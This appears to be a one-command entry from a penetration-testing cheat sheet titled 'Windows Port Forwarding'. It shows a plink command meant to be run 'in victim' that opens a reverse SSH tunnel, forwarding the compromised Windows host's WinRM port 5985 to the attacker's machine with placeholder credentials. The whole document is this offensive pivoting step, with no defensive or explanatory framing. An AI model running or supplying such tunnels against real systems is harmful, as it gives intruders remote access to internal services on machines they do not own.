### Windows Port Forwarding

Run in victim (5985 WinRM):
```shell
plink -l $LOCAL_USER -pw $LOCAL_PASSWORD $LOCAL_IP -R 5985:127.0.0.1:5985 -P 221
```

